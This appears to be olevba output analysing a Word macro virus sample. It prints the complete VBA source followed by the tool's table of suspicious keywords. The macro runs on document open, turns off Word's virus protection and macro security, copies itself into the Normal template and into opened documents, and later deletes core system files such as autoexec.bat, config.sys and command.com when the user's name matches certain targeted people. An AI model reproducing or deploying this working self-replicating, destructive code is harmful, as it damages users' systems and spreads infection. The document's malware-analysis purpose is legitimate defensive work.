olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ami.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ami.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cockstand.bas 
in file: Virus.MSWord.Ami.c - OLE stream: 'Macros/VBA/Cockstand'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Normal_ As Object, Active_ As Object
Sub AutoOpen()
 On Error Resume Next
 StealthOn
 Add_Modul_Infection
 Infect
 ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Function Tdecrypt(iString) As String
              Dim x%, b%, c%
               Tdecrypt = ""
                     For x = 1 To Len(iString)
                         b = Asc(Mid$(iString, x, 1))
                         c = b - 3
                         Tdecrypt = Tdecrypt + Chr$(c)
                     Next x
End Function
Function SEncrypt(iString) As String
For a = 1 To Len(iString)
                 b = Mid$(iString, a, 1)
                 d = Asc(b) + 3
                 SEncrypt = SEncrypt + Chr$(d)
Next
End Function
Public Sub StealthOn()
On Error Resume Next
Application.EnableCancelKey = (Rnd * 0)
Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
Options.ConfirmConversions = (Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
ActiveDocument.ReadOnlyRecommended = (Rnd * 0)
CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
Application.CommandBars("Tools").Controls(12).Enabled = (Rnd * 0)
CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = (Rnd * 0)
CommandBars("Format").Controls("Style...").Enabled = (Rnd * 0)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Sub
Sub Infect()
Dim Msg As String
On Error Resume Next
 With Application.FileSearch
    .FileName = "cockstand.txt"
    .LookIn = "C:\windows\"
    .Execute
    If .FoundFiles.Count = 1 Then
        Call Read_write(Msg, False)
    Else
        Msg = Application.UserName
        Application.UserName = "I HATE KOSTA!!!"
        Application.UserInitials = "GFO"
        Call Read_write(Msg, True)
    End If
 End With
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub Read_write(Name As String, OpenType As Boolean)
Dim line1 As Date
Result = False
Const ForReading = 1, ForWriting = 2, ForAppending = 3
Const TristateUseDefault = -2, TristateTrue = -1, TristateFalse = 0
Dim fs, f, ts, s
Set fs = CreateObject("Scripting.FileSystemObject")
   If OpenType = True Then
      fs.CreateTextFile "c:\windows\cockstand.txt"
      Set f = fs.GetFile("c:\windows\cockstand.txt")
      Set ts = f.OpenAsTextStream(ForWriting, TristateUseDefault)
      ts.writeline (SEncrypt(Date))
      ts.writeline (SEncrypt(Name))
      ts.writeline ("You're InFeCteD by the cockstand virus!!!Die,Die,Die.")
      ts.writeline ("                    --==FiShMaN==--")
      ts.Close
    Else
      Set f = fs.GetFile("c:\windows\cockstand.txt")
      Set ts = f.OpenAsTextStream(ForReading, TristateUseDefault)
      line1 = Tdecrypt(ts.readline)
      Line2 = Tdecrypt(ts.readline)
      action = (line1 + 31)
      If line1 = ActionDay Then
      If InStr(1, UCase(Line2), "KOSTA") Then
           Result = InStr(0, UCase(Line2), "KOSTA")
        Else
            If InStr(1, UCase(Line2), "DYLAN") Or InStr(1, UCase(Line2), "NEL") Then
               Result = InStr(1, UCase(Line2), "DYLAN")
            Else
               If InStr(1, UCase(Line2), "TERENCE") Or InStr(1, UCase(Line2), "CONRADIE") Then
                  Result = InStr(1, UCase(Line2), "TERENCE")
               Else
                   If InStr(1, UCase(Line2), "KOCKETT") Or InStr(1, UCase(Line2), "AMY") Then
                      Result = InStr(1, UCase(Line2), "KOCKETT")
                   Else
                      If InStr(1, UCase(Line2), "WEARING") Or InStr(1, UCase(Line2), "VANNESSA") Then
                         Result = InStr(1, UCase(Line2), "WEARING")
                      Else
                          If InStr(1, UCase(Line2), "ROGERS") Or InStr(1, UCase(Line2), "BELINDA") Then
                             Result = InStr(1, UCase(Line2), "ROGERS")
                          Else
                          End If
                      End If
                   End If
               End If
            End If
        End If
        Select Case (Result)
               Case True
                         Kill ("c:\autoexec.bat")
                         Kill ("c:\config.sys")
                         Kill ("c:\windows\win.ini")
                         Kill ("c:\windows\system.ini")
                         Kill ("c:\command.com")
                         Kill ("c:\windows\win.com")
                         MsgBox "I HATE U!!!!DIE.", vbCritical
               Case False
                         MsgBox "Mr " & Line2 & ", You have Been infected for 31 Days.", vbOKOnly, "Cockstand v1.0b"
        End Select
      Else
      End If
      ts.Close
    End If
End Sub
Sub Add_Modul_Infection()
On Error Resume Next
Set Normal_ = NormalTemplate.VBProject
Set Active_ = ActiveDocument.VBProject
Const ModulName_ = "Cockstand"
NormalIns_ = False
ActiveIns_ = False
CheckRefNormal_
CheckRefActive_
NormalComp_ = Normal_.VBComponents.Count
ActiveComp_ = Active_.VBComponents.Count
For x = 1 To NormalComp_
    If Normal_.VBComponents(x).Name = ModulName_ Then _
    NormalIns_ = True
Next
For y = 1 To ActiveComp_
    If Active_.VBComponents(y).Name = ModulName_ Then _
    ActiveIns_ = True
Next
If NormalIns_ = False Then
    VirusLength_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
    Normal_.VBComponents.Add (vbext_ct_StdModule)
    Normal_.VBComponents((NormalComp_ + 1)).Name = ModulName_
    Normal_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_
End If
If ActiveIns_ = False Then
    VirusLength_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines
    VirusCode_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)
    Active_.VBComponents.Add (vbext_ct_StdModule)
    Active_.VBComponents((ActiveComp_ + 1)).Name = ModulName_
    Active_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_
End If
End Sub
Function CheckRefNormal_()
CheckRefNormal_ = False
For i = 1 To Normal_.References.Count
    If Normal_.References(i).Name = "VBIDE" Then CheckRefNormal_ = True
Next
If CheckRefNormal_ = False Then
    Normal_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If
End Function
Function CheckRefActive_()
CheckRefActive_ = False
For i = 1 To Active_.References.Count
    If Active_.References(i).Name = "VBIDE" Then CheckRefActive_ = True
Next
If CheckRefActive_ = False Then
    Active_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If
End Function















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

